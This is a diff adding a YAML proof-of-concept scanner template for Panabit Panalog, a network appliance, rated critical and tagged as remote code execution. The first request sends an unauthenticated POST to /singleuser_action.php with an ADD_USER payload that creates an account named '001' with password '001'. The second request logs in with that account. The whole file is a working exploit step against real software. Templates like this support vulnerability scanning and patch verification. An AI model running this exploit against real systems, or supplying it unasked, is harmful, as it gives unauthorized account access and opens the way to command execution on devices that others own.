@@ -1,0 +1,32 @@
+id: poc-yaml-panabit-panalog-create-any-user
+info:
+  name: Panabit panalog 任意用户创建漏洞和后台命令执行
+  severity: critical
+  tags:
+  - rce
+  fofa: null
+  finger: ''
+requests:
+- method: POST
+  path: /singleuser_action.php
+  headers:
+    X-Requested-With: XMLHttpRequest
+  data: '{ "syncInfo": { "user": { "userId": "001", "userName": "001", "employeeId":
+    "001", "departmentId": "001", "departmentName": "001", "coporationId": "001",
+    "corporationName": "001", "userSex": "1",  "userDuty": "001", "userBirthday":
+    "001", "userPost": "001", "userPostCode": "001", "userAlias": "001", "userRank":
+    "001", "userPhone": "001", "userHomeAddress": "001", "userMobilePhone": "001",
+    "userMailAddress": "001", "userMSN": "001", "userNt": "001", "userCA": "001",
+    "userPwd": "001", "userClass": "001", "parentId": "001", "bxlx": "001" },"operationType":
+    "ADD_USER" } }'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"yn\\\":\\\"yes\\\"\") &&\n\
+    contains(body,\"\\\"str\\\":\\\"OK\\\"\")\n"
+- method: POST
+  path: /login.php
+  headers:
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: user=001&mypass=001&sec=
+  expression: "status_code == 200 && \ncontains(body,\"\\\"yn\\\":\\\"yes\\\"\")\n"
+variables: {}
+transport: http
